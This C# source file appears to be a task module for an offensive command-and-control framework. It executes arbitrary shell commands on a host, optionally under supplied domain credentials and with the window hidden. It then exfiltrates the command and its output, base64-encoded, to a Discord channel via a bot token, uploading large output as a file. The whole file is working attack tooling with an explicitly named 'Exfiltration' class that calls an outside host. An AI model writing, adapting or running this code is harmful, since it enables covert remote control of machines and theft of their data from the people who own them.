using System;
using System.Text;
using System.Net;
using System.IO;
using System.Diagnostics;

public static class Task
{
    public static string Execute(string ShellCommand, string BotToken, string ChannelId)
    {
        try
        {
            string CommandOutput = Shell.ShellExecute(ShellCommand);
            return Exfiltration.SendToDiscord(ShellCommand, CommandOutput, BotToken, ChannelId);

        }
        catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
    }
}

public class Shell
{
    public static string ShellExecute(string ShellCommand, string Username = "", string Domain = "", string Password = "")
    {
        if (Environment.OSVersion.Platform == PlatformID.Unix || Environment.OSVersion.Platform == PlatformID.MacOSX)
        {
            return ShellExecuteWithPath(ShellCommand, "/bin/", Username, Domain, Password);
        }
        else if (Environment.OSVersion.Platform.ToString().Contains("Win32"))
        {
            return ShellExecuteWithPath(ShellCommand, "C:\\Windows\\System32\\", Username, Domain, Password);
        }
        return ShellExecuteWithPath(ShellCommand, "~", Username, Domain, Password);
    }

    public static string ShellCmdExecute(string ShellCommand, string Username = "", string Domain = "", string Password = "")
    {
        if (Environment.OSVersion.Platform == PlatformID.Unix || Environment.OSVersion.Platform == PlatformID.MacOSX)
        {
            return ShellExecute("bash -c " + ShellCommand, Username, Domain, Password);
        }
        else if (Environment.OSVersion.Platform.ToString().Contains("Win32"))
        {
            return ShellExecute("cmd.exe /c " + ShellCommand, Username, Domain, Password);
        }
        return ShellExecute("cmd.exe /c " + ShellCommand, Username, Domain, Password);
    }

    public static string ShellExecuteWithPath(string ShellCommand, string Path, string Username = "", string Domain = "", string Password = "")
    {
        if (ShellCommand == null || ShellCommand == "") return "";

        string ShellCommandName = ShellCommand.Split(' ')[0];
        string ShellCommandArguments = "";
        if (ShellCommand.Contains(" "))
        {
            ShellCommandArguments = ShellCommand.Replace(ShellCommandName + " ", "");
        }

        Process shellProcess = new Process();
        if (Username != "")
        {
            shellProcess.StartInfo.UserName = Username;
            shellProcess.StartInfo.Domain = Domain;
            System.Security.SecureString SecurePassword = new System.Security.SecureString();
            foreach (char c in Password)
            {
                SecurePassword.AppendChar(c);
            }
            shellProcess.StartInfo.Password = SecurePassword;
        }
        shellProcess.StartInfo.FileName = ShellCommandName;
        shellProcess.StartInfo.Arguments = ShellCommandArguments;
        shellProcess.StartInfo.WorkingDirectory = Path;
        shellProcess.StartInfo.UseShellExecute = false;
        shellProcess.StartInfo.CreateNoWindow = true;
        shellProcess.StartInfo.RedirectStandardOutput = true;
        shellProcess.StartInfo.RedirectStandardError = true;

        var output = new StringBuilder();
        shellProcess.OutputDataReceived += (sender, args) => { output.AppendLine(args.Data); };
        shellProcess.ErrorDataReceived += (sender, args) => { output.AppendLine(args.Data); };

        shellProcess.Start();

        shellProcess.BeginOutputReadLine();
        shellProcess.BeginErrorReadLine();
        shellProcess.WaitForExit();

        return output.ToString().TrimEnd();
    }
}

public class Exfiltration
{
    public static string SendToDiscord(string Command, string CommandOutput, string BotToken, string ChannelId)
    {
      	var postData = "";
        try
        {
          	var request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/channels/" + ChannelId + "/messages");
          	request.Method = "POST";
          	request.Headers.Add("Authorization", "Bot " + BotToken);
          	request.ContentType = "application/json";
          	request.UserAgent = "DiscordBot";
          	
          	var CommandOutputBase64 = System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes("[*] Command Executed:\n" + Command + "\n[*] Output:\n" + CommandOutput));
            postData = "{\"content\":\"" + CommandOutputBase64 + "\"}";
            var data = Encoding.ASCII.GetBytes(postData);
          
            if (data.Length > 2000)
            {
                string fileName = System.IO.Path.GetTempPath() + Guid.NewGuid().ToString();
                using (StreamWriter outputFile = new StreamWriter(fileName))
                {
                     outputFile.WriteLine(CommandOutputBase64);
                }
                
                string boundary = "----------------------------" + DateTime.Now.Ticks.ToString("x");
                byte[] boundaryBytes = System.Text.Encoding.UTF8.GetBytes(Environment.NewLine + "--" + boundary + Environment.NewLine);
                byte[] trailer = System.Text.Encoding.UTF8.GetBytes("--" + boundary + "--" + Environment.NewLine);
                byte[] boundaryBytesF = System.Text.Encoding.ASCII.GetBytes("--" + boundary + Environment.NewLine);

                request.ContentType = "multipart/form-data; boundary=" + boundary;
                request.KeepAlive = true;

                Stream requestStream = request.GetRequestStream();
                requestStream.Write(boundaryBytes, 0, boundaryBytes.Length);

                byte[] formItemBytes = System.Text.Encoding.UTF8.GetBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"" + Environment.NewLine);
                requestStream.Write(formItemBytes, 0, formItemBytes.Length);
                
                formItemBytes = System.Text.Encoding.UTF8.GetBytes("Content-Type: application/octet-stream" + Environment.NewLine + Environment.NewLine);
                requestStream.Write(formItemBytes, 0, formItemBytes.Length);

                formItemBytes = System.Text.Encoding.UTF8.GetBytes(CommandOutputBase64 + Environment.NewLine);
                requestStream.Write(formItemBytes, 0, formItemBytes.Length);
                
                requestStream.Write(boundaryBytesF, 0, boundaryBytesF.Length);

                formItemBytes = System.Text.Encoding.UTF8.GetBytes("Content-Disposition: form-data; name=\"payload_json\"" + Environment.NewLine + Environment.NewLine);
                requestStream.Write(formItemBytes, 0, formItemBytes.Length);

                formItemBytes = System.Text.Encoding.UTF8.GetBytes("{\"content\": \"data\"}" + Environment.NewLine);
                requestStream.Write(formItemBytes, 0, formItemBytes.Length);
                
                requestStream.Write(trailer, 0, trailer.Length);
                requestStream.Close();

                using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
                {
                    return reader.ReadToEnd();
                };
            } else {
                request.ContentLength = data.Length;

                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }

                var response = (HttpWebResponse)request.GetResponse();
                var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                return responseString;
            }
        }
        catch (Exception e) {
            return postData + e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; 
        }
        
    }
}